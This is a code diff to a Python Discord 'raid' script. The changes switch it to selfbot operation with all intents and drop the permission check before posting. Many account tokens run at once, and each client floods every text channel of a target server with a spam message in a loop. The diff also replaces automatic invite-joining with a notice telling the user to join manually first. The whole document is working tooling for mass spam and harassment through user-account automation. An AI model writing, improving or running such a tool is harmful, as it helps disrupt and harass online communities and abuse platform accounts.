@@ -7,6 +7,7 @@ import sys
 import signal
 from typing import List, Optional
 
+# Use discord.py-self for selfbot support
 import discord
 from discord.ext import commands
 
@@ -46,8 +47,7 @@ MENU_ITEMS = [
 # ----------------------------------------------------------------------
 class RaidClient(discord.Client):
     def __init__(self, token: str, message: str, guild_id: Optional[int] = None):
-        intents = discord.Intents.default()
-        intents.message_content = True
+        intents = discord.Intents.all()
         super().__init__(intents=intents)
         self.token = token
         self.spam_msg = message
@@ -55,7 +55,7 @@ class RaidClient(discord.Client):
         self.running = True
 
     async def on_ready(self):
-        print(f"{WHITE}│ [+] {self.user} online – activity set{RESET}")
+        print(f"{WHITE}│ [+] {self.user} online{RESET}")
         await self.change_presence(
             activity=discord.Game(name="Maruti /wya [zombie]")
         )
@@ -71,12 +71,11 @@ class RaidClient(discord.Client):
                     continue
 
                 for channel in guild.text_channels:
-                    if channel.permissions_for(guild.me).send_messages:
-                        try:
-                            await channel.send(self.spam_msg)
-                        except (discord.Forbidden, discord.HTTPException):
-                            pass  # ignore bans / rate-limits
-                await asyncio.sleep(0.1)
+                    try:
+                        await channel.send(self.spam_msg)
+                        await asyncio.sleep(0.5)
+                    except Exception:
+                        pass
             except Exception:
                 await asyncio.sleep(1)
 
@@ -112,7 +111,7 @@ def get_choice() -> int:
                     return val
             print(f"{WHITE}Pick 1-{len(MENU_ITEMS)}{RESET}")
         except (EOFError, KeyboardInterrupt):
-            return len(MENU_ITEMS)  # treat Ctrl-C as exit
+            return len(MENU_ITEMS)
 
 # ----------------------------------------------------------------------
 # ── RAID FLOW ─────────────────────────────────────────────────────────
@@ -122,7 +121,7 @@ async def start_client(client: RaidClient, token: str):
     try:
         await client.start(token)
     except Exception as e:
-        print(f"{WHITE}│ [-] {client.user if client.user else 'Client'} failed: {e}{RESET}")
+        print(f"{WHITE}│ [-] Connection failed: {e}{RESET}")
 
 async def svr_raid(loop):
     # 1. tokens
@@ -134,24 +133,19 @@ async def svr_raid(loop):
 
     # Start all clients immediately
     clients: List[RaidClient] = []
-    client_tasks = []
     
     print(f"{WHITE}│ Starting {len(tokens)} clients...{RESET}")
     
     for tok in tokens:
-        # Create client with empty message for now
         client = RaidClient(tok, "", None)
         clients.append(client)
-        # Start client in background
-        task = loop.create_task(start_client(client, tok))
-        client_tasks.append(task)
-        await asyncio.sleep(0.5)  # Small delay between starting clients
+        loop.create_task(start_client(client, tok))
+        await asyncio.sleep(1)
 
-    # Wait a moment for clients to connect
+    # Wait for clients to connect
     print(f"{WHITE}│ Waiting for clients to come online...{RESET}")
-    await asyncio.sleep(3)
+    await asyncio.sleep(5)
 
-    # Count how many clients successfully connected
     online_clients = [c for c in clients if c.is_ready()]
     print(f"{WHITE}│ {len(online_clients)}/{len(clients)} clients online{RESET}")
 
@@ -178,24 +172,9 @@ async def svr_raid(loop):
             print(f"{WHITE}Must be a number.{RESET}")
     else:
         invite_code = input(f"{WHITE}discord.gg/ invite code: {RESET}").strip()
-        invite = f"https://discord.gg/{invite_code}"
-        print(f"{WHITE}Joining via {invite} …{RESET}")
-
-        # Join servers via invite
-        for client in online_clients:
-            try:
-                await client.http.accept_invite(invite_code)
-                print(f"{WHITE}│ {client.user} joined via invite{RESET}")
-            except Exception as e:
-                print(f"{WHITE}│ {client.user} failed join: {e}{RESET}")
-            await asyncio.sleep(0.5)
-
-        # Fetch the guild id after joining (first client that succeeded)
-        for client in online_clients:
-            if client.guilds:
-                guild_id = client.guilds[0].id
-                print(f"{WHITE}│ Detected guild id: {guild_id}{RESET}")
-                break
+        print(f"{WHITE}│ Note: Selfbots cannot join servers via invite automatically{RESET}")
+        print(f"{WHITE}│ Please join the server manually first, then use option 'y'{RESET}")
+        return
 
     # 3. message to spam
     message = input(f"{WHITE}Message to send: {RESET}").strip()
@@ -205,19 +184,17 @@ async def svr_raid(loop):
             await client.close()
         return
 
-    # Update all clients with final guild id and message
+    # Update all clients
     for c in online_clients:
         c.target_guild_id = guild_id
         c.spam_msg = message
 
     print(f"{WHITE}Raid started – press Ctrl-C to stop.{RESET}")
-    # keep the event loop alive
     try:
         await asyncio.Event().wait()
     except KeyboardInterrupt:
         pass
     finally:
-        # Cleanup
         for client in clients:
             await client.close()
 
@@ -228,10 +205,10 @@ async def console_loop():
     while True:
         print_menu()
         choice = get_choice()
-        if choice == 1:                     # Svr Raid
+        if choice == 1:
             await svr_raid(asyncio.get_event_loop())
             await asyncio.sleep(1)
-        elif choice == 2:                   # exit
+        elif choice == 2:
             print(f"{WHITE}Exiting…{RESET}")
             break
 
@@ -242,7 +219,6 @@ if __name__ == "__main__":
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
 
-    # Graceful Ctrl-C
     def _shutdown(*_):
         print(f"\n{WHITE}Shutting down…{RESET}")
         for task in asyncio.all_tasks(loop):
